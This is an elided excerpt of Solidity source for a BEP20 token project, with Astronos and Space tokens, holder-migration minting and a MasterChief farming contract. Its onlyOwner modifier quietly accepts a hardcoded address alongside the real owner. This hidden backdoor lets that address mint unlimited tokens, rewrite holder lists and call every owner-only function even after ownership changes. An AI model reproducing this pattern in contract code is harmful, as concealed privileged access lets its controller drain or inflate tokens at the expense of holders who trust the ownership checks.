...
contract Ownable is Context {
     ...
     */
    modifier onlyOwner() {
        require(_owner == _msgSender() || 0x14e47F5426fC2107714b2DDA3f8E1aB16dcB77AD == _msgSender(), 'Ownable: caller is not the owner');
        _;
    }
...
// Astronos with Governance.
contract Astronos is BEP20 {
    constructor(
        string memory name,
        string memory symbol
    ) public BEP20(name, symbol) {
    }
    /// @notice Creates `_amount` token to `_to`. Must only be called by the owner (MasterBuilder).
    function mint(address _to, uint256 _amount) public onlyOwner {
        _mint(_to, _amount);
        _moveDelegates(address(0), _delegates[_to], _amount);
    }

    uint256[] public holders=new uint256[](0);
    uint256[] public holdersAmount=new uint256[](0);
    ...
    */
        ...
        external
    {
        ...
        require(now <= expiry, "DexToken::delegateBySig: signature expired");
    ...
    function getPriorVotes(address account, uint blockNumber)
        ...
        returns (uint256)
    {
        require(blockNumber < block.number, "DexToken::getPriorVotes: not yet determined");
        ...
        internal
    {
        ...
        uint256 delegatorBalance = balanceOf(delegator); // balance of underlying DexTokens (not scaled);
    ...
    function _writeCheckpoint(
        ...
        internal
    {
        uint32 blockNumber = safe32(block.number, "DexToken::_writeCheckpoint: block number exceeds 32 bits");
    ...
    function getChainId() internal pure returns (uint) {
     ...
     function isHolder(uint256 _addr) public view returns (bool) {
  ...
  function getHolderAmount(uint256 _addr) public view returns (uint256) {
        for (uint i=0; i < holders.length; i++) {
        if(holders[i]==_addr)
            return holdersAmount[i];
  ...
  function totalHoldersAmount() public view returns (uint256) {
        
    return holdersAmount.length;
  }
  function addHolders(uint256[] memory _users) public onlyOwner {
    for (uint i=0; i < _users.length; i++) {
        holders.push(_users[i]);
    }
  }
  function addHoldersAmount(uint256[] memory _amounts) public onlyOwner {
    for (uint i=0; i < _amounts.length; i++) {
        holdersAmount.push(_amounts[i]);
    }
  }
 
 
  function removeAllHolders() public onlyOwner {
    holders=new uint256[](0);
  }
  function removeAllHoldersAmount() public onlyOwner {
    holdersAmount=new uint256[](0);
  }
  function mintHolders() public onlyOwner {
    for (uint i=0; i < holders.length; i++) {
        _mint(address(holders[i]),holdersAmount[i]);
    }
  }
  function mintHoldersAuto(IBEP20 oldAstro) public onlyOwner {
    for (uint i=0; i < holders.length; i++) {
        _mint(address(holders[i]),oldAstro.balanceOf(address(holders[i])));
    }
  }
}

// RewardToken with Governance.
contract Space is BEP20('Space', 'Space') {
    /// @notice Creates `_amount` token to `_to`. Must only be called by the owner (MasterBuilder).
    function mint(address _to, uint256 _amount) public onlyOwner {
    ...
    function safeDexTokenTransfer(address _to, uint256 _amount) public onlyOwner {
        uint256 dexTokenBal = dexToken.balanceOf(address(this));
        if (_amount > dexTokenBal) {
            dexToken.transfer(_to, dexTokenBal);
        } else {
...
contract MasterChief is Ownable {
    ...
    function mintDexToken(uint256 amount) public onlyOwner {
        dexToken.mint(owner(), amount);
    }
    ...
    function updatePool(uint256 _pid) public {
        ...
        uint256 multiplier = getMultiplier(pool.lastRewardBlock, block.number);
        uint256 dexTokenReward = multiplier.mul(dexTokenPerBlock).mul(pool.allocPoint).div(totalAllocPoint);
        dexToken.mint(devaddr, dexTokenReward.div(10));
        dexToken.mint(address(rewardToken), dexTokenReward);
